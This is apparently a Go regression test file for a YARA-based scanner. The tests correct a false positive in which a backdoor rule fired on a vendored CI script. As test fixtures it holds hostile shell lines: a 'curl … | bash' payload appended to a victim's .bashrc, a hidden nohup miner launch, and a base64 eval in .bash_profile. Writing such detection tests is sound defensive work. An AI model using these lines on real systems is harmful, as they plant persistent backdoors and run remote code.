//go:build yara

package yara

import "testing"

// Regression tests for the 2026-07-24 double-critical on a vendored library CI
// script (twig's drupal_test.sh). backdoor_bashrc_injection is documented as a
// shell-startup-file backdoor, but its YARA-X condition carried no startup-file
// context at all, so it fired on every shell script that piped a download to a
// shell -- duplicating dropper_wget_pipe_exec under a misleading name and
// category. The YAML twin was already scoped by file type; this restores parity.

// twigCIScript is the shape of the real vendored file: a CI harness that
// installs a framework CLI from its vendor domain. No shell startup file is
// touched anywhere in it.
const twigCIScript = `#!/bin/bash
set -x
set -e
REPO=` + "`pwd`" + `
cd /tmp
rm -rf drupal-twig-test
composer create-project --no-interaction drupal-composer/drupal-project:8.x-dev drupal-twig-test
cd drupal-twig-test
wget https://get.symfony.com/cli/installer -O - | bash
export PATH="$HOME/.symfony/bin:$PATH"
symfony server:start -d --no-tls
`

func TestFPVendorCIScript_NotABashrcBackdoor(t *testing.T) {
	s := loadRepoYaraScanner(t)
	if hasYaraRule(s.ScanBytes([]byte(twigCIScript)), "backdoor_bashrc_injection") {
		t.Error("backdoor_bashrc_injection FP: matched a CI script that touches no shell startup file")
	}
}

// The download-and-pipe-to-shell technique itself is still reported. This is a
// deliberate true positive: the pattern is the technique, regardless of who
// shipped the script.
func TestFPVendorCIScript_PipeToShellStillReported(t *testing.T) {
	s := loadRepoYaraScanner(t)
	if !hasYaraRule(s.ScanBytes([]byte(twigCIScript)), "dropper_wget_pipe_exec") {
		t.Error("dropper_wget_pipe_exec regression: download piped to a shell no longer detected")
	}
}

func TestBashrcInjection_AppendToStartupFileStillDetected(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte("#!/bin/sh\necho 'curl http://198.51.100.7/x.sh | bash' >> /home/victim/.bashrc\n")
	if !hasYaraRule(s.ScanBytes(mal), "backdoor_bashrc_injection") {
		t.Error("backdoor_bashrc_injection regression: payload appended to .bashrc not detected")
	}
}

func TestBashrcInjection_HiddenBackgroundExecStillDetected(t *testing.T) {
	s := loadRepoYaraScanner(t)
	// Startup files are scanned without a filename, so hidden background
	// execution has to stand on its own as rc content.
	mal := []byte("nohup /tmp/.miner --config /tmp/.c &\n")
	if !hasYaraRule(s.ScanBytes(mal), "backdoor_bashrc_injection") {
		t.Error("backdoor_bashrc_injection regression: hidden background exec in rc content not detected")
	}
}

func TestBashrcInjection_EvalSubshellInStartupFileStillDetected(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte("# ~/.bash_profile\neval $(echo ZWNobyBwd25lZAo= | base64 -d)\n")
	if !hasYaraRule(s.ScanBytes(mal), "backdoor_bashrc_injection") {
		t.Error("backdoor_bashrc_injection regression: eval-subshell backdoor in a startup file not detected")
	}
}
